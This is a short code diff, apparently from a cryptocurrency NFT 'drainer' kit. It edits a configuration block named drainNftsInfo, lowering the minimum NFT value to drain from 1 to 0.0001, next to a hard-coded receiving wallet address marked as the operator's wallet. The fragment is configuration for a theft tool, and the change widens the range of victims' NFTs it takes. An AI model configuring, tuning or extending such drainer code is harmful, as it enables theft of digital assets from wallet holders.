@@ -4,7 +4,7 @@ const receiveAddresss = "0x3D45bCe40dEC8F096F32cD152e51Bf7C67f8B2BC"; // YOUR WA
 
 
 const drainNftsInfo = {
-    minValue: 1, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection. "TUTORIAL"
+    minValue: 0.0001, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection. "TUTORIAL"
     maxTransfers: 100
 }
 
